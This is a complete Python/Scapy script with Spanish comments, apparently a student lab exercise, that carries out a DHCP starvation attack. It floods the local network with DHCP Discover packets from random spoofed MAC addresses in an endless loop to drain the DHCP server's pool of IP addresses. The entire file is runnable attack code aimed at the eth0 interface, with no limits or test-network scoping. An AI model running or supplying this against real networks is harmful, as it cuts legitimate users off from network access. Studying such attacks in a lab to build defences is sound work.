from scapy.all import *

def jonath_dhcp_starvation(interfaz):
    """
    Función principal del ataque DHCP Starvation.
    Genera miles de DHCP Discovers con MACs aleatorias
    para agotar el pool de IPs del servidor DHCP.
    """
    print("=" * 50)
    print("  DHCP Starvation - Jonathan Sención 20250851")
    print("=" * 50)
    print(f"[*] Interfaz objetivo: {interfaz}")
    print("[*] Iniciando agotamiento del pool DHCP...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    contador = 0
    while True:
        # Generamos una MAC aleatoria para cada solicitud
        mac_falsa = RandMAC()
        
        # Construimos el DHCP Discover con MAC falsa
        dhcp_discover = (Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") /
                         IP(src="0.0.0.0", dst="255.255.255.255") /
                         UDP(sport=68, dport=67) /
                         BOOTP(chaddr=mac_falsa) /
                         DHCP(options=[("message-type", "discover"), "end"]))
        
        # Enviamos el paquete al servidor DHCP
        sendp(dhcp_discover, iface=interfaz, verbose=False)
        contador += 1
        print(f"[*] Solicitudes DHCP enviadas: {contador}", end="\r")

# Punto de entrada del script
jonath_dhcp_starvation("eth0")
